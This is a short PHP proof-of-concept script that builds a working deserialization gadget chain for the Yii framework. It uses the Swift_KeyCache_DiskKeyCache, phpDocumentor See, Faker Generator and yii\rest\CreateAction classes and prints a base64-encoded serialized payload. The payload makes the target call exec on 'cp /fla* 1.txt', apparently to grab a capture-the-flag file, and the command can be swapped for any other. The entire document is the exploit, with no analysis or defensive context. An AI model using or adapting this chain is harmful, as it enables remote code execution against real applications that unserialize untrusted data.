<?php

namespace yii\rest {

    class CreateAction
    {

        public $checkAccess;
        public $id;

        public function __construct()
        {

            $this->checkAccess = 'exec';
            $this->id = 'cp /fla* 1.txt';
        }
    }
}

namespace Faker {

    use yii\rest\CreateAction;

    class Generator
    {

        protected $formatters;

        public function __construct()
        {

            // 这里需要改为isRunning
            $this->formatters['render'] = [new CreateAction(), 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags {


    use Faker\Generator;

    class See
    {

        protected $description;

        public function __construct()
        {

            $this->description = new Generator();
        }
    }
}

namespace {

    use phpDocumentor\Reflection\DocBlock\Tags\See;

    class Swift_KeyCache_DiskKeyCache
    {

        private $keys = [];
        private $path;

        public function __construct()
        {

            $this->path = new See;
            $this->keys = array(
                "axin" => array("is" => "handsome")
            );
        }
    }

    // 生成poc
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
}
?>